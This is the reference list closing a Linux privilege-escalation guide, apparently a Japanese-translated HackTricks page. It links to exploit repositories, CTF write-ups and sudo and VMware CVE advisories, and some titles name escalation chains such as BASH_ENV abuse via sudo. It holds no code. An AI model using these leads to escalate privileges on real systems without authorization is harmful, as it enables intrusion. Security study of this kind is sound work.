- [11] [frizb/Linux-Privilege-Escalation：Linux Priv Escalation の Tips and Tricks](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i：Linux Enumeration & Privilege Escalation tool](https://github.com/rtcrowley/linux-private-i)
- [14] [Socket とは？](https://www.linux.com/news/what-socket/)
- [15] [Peppo (Proving Grounds) writeup](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [D-BUS に接続する](https://www.linuxjournal.com/article/7744)
- [17] [SUID Executables Linux Privilege Escalation](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo Part-2 – Linux Privilege Escalation](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Linux で ACLs を管理する方法](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [network-scripts を介した Redhat/CentOS root](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [systemd とは？](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka（logs を介した bash arithmetic injection、overall chain）](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [GNU Bash Manual – BASH_ENV（non-interactive startup file）](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment（sudo env_keep BASH_ENV → root）](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous（sudo terraform dev_overrides + TF_VAR symlink privesc）](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik（pg_basebackup cron copy → SUID bash）](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – You name it, VMware elevates it（CVE-2025-41244）](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463：Sudo Chroot Elevation of Privilege](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – CVE-2025-32462 and CVE-2025-32463 Sudo elevation-of-privilege vulnerabilities](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [32] [Python importlib docs](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [@paragonsec による Tweet](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Linux での Passwords の Logging](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Logrotate Race Condition の Details](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
{{#include ../../../banners/hacktricks-training.md}}
